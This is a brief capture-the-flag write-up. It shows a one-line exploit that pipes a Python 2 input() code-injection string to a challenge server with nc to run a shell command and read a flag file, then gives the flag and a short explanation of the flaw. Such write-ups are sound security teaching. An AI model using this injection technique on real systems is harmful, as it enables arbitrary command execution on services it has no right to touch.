echo '__import__("os").system("cat valentine.txt")' | nc 0.cloud.chals.io 34293

Flag: valentine{0ops_i_go7_hydrog3n_ball00n5_NONOWHEREAREYOUGOINGWITHTHATLIGHTER}


Since it's python 2, you can exploit the use of input().
If importing os, you can use system to execute arbitrary code. In this case you just want to cat valentine.txt